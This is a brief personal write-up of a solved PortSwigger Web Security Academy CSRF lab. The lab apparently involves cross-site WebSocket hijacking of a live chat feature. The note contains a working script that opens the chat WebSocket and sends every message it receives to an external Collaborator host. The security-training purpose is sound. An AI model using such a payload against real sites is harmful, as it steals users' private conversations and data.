
#portswigger #solution #csrf

- **Category:** [[Cross-site request forgery (CSRF)]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/csrf
- **Date Solved:** 2026-08-16

This LAB don't provide any credentials anymore ;(
![[Pasted image 20260816075205.png]]

There's a new Live Chat section:
![[Pasted image 20260816075244.png]]

This chat 
![[Pasted image 20260816084648.png]]
```html
<script>
    var ws = new WebSocket('wss://0ade00eb04093c3a8153b16e005200e2.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://yvx84cbjz33kcl5txw5kir1vsmydm3as.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![[Pasted image 20260816084703.png]]
![[Pasted image 20260816085024.png]]